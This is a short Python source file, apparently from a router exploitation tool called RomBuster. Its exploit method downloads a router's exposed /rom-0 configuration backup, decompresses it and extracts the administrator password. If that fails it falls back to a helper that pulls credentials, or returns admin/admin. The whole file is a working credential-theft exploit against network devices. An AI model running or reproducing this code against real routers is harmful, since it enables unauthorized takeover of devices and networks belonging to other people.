
import http.client
import re
import requests
from pex.string import String

from .trigger import Trigger


class RomBuster(String):
   

    def __init__(self) -> None:
        super().__init__()

    def exploit(self, address: str) -> tuple:
       

        try:
            response = requests.get(
                f"http://{address}/rom-0",
                verify=False,
                timeout=3
            )

            username = 'admin'
            data = response.content[8568:]
            result = self.lzs_decompress(data)

            password = re.findall("([\040-\176]{5,})", result)
            if len(password):
                return username, password[0]

        except Exception:
            trigger = Trigger(address.split(':')[0])
            username, password = trigger.extract_credentials()

            if username is None and password is None:
                return

            if not username and not password:
                return 'admin', 'admin'

            return username, password
